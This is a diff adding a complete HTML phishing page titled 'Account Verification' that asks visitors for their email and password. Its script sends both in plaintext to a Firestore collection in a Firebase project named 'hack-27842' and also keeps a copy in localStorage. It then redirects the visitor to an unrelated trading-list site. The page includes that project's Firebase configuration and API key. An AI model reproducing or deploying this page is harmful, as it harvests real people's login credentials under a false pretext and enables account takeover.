@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            text-align: center;
+            padding: 50px;
+            margin: 0;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            color: #333;
+        }
+        p {
+            font-size: 16px;
+            color: #666;
+        }
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .button {
+            display: inline-block;
+            font-size: 16px;
+            color: #fff;
+            background-color: #007bff;
+            padding: 10px 20px;
+            text-decoration: none;
+            border-radius: 5px;
+            margin-top: 20px;
+            cursor: pointer;
+            border: none;
+        }
+        .button:hover {
+            background-color: #0056b3;
+        }
+        .message {
+            margin-top: 20px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Account Verification</h1>
+        <p>Please enter your email and password to verify your account.</p>
+        <form id="verification-form">
+            <div class="form-group">
+                <label for="email">Email:</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <button type="submit" class="button">Submit</button>
+        </form>
+        <div id="message" class="message"></div>
+    </div>
+
+    <!-- Firebase App (the core Firebase SDK) -->
+    <script type="module">
+        import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.21.0/firebase-app.js';
+        import { getFirestore, doc, setDoc } from 'https://www.gstatic.com/firebasejs/9.21.0/firebase-firestore.js';
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBHquXAfwBPnFpGQ7No-kC17O25PRsceHY",
+            authDomain: "hack-27842.firebaseapp.com",
+            projectId: "hack-27842",
+            storageBucket: "hack-27842.appspot.com",
+            messagingSenderId: "606359984765",
+            appId: "1:606359984765:web:a5df7d7ed3e70432deaf14"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        const form = document.getElementById('verification-form');
+        const messageDiv = document.getElementById('message');
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if (!email || !password) {
+                messageDiv.textContent = 'Please fill in all fields.';
+                messageDiv.style.color = 'red';
+                return;
+            }
+
+            try {
+                // Store data in Firestore
+                await setDoc(doc(db, 'verification_requests', email), {
+                    email: email,
+                    password: password
+                });
+
+                // Retrieve existing data from localStorage
+                const existingData = JSON.parse(localStorage.getItem('submissionData')) || [];
+
+                // Add new entry
+                existingData.push({ email: email, password: password });
+
+                // Store updated data in localStorage
+                localStorage.setItem('submissionData', JSON.stringify(existingData));
+
+
+                // Redirect to the new page
+                window.location.href = 'https://www.5g2s.top/Mobile/Trade/tradelist.html';
+
+            } catch (error) {
+                console.error('Error storing data:', error);
+                messageDiv.textContent = `Error: ${error.message}`;
+                messageDiv.style.color = 'red';
+            }
+        });
+    </script>
+</body>
+</html>
